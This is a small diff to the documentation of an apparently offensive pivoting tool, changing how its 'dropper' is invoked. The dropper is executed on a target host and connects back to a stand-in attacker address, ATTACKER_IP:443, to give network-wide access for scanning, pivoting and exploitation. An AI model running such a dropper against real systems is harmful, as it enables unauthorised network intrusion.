@@ -30,7 +30,7 @@ Limited to executing commands on the local host.
 {% card title="Dropper Mode" icon="parachute" %}
 Provides Layer 3 access to the entire network.
 ```bash
-./wallhack-drop ATTACKER:443
+wallhack-drop ATTACKER:443
 ```
 Enables scanning, pivoting, and exploitation across the network.
 {% /card %}
@@ -55,7 +55,7 @@ Configure the entry node to accept dropper connections.
 {% step title="Deploy Binary" number=2 %}
 Transfer and execute the dropper on the target.
 
-{% codeblock code="./wallhack-drop ATTACKER_IP:443" title="Target host" /%}
+{% codeblock code="wallhack-drop ATTACKER_IP:443" title="Target host" /%}
 {% /step %}
 
 {% step title="Automatic Setup" number=3 %}
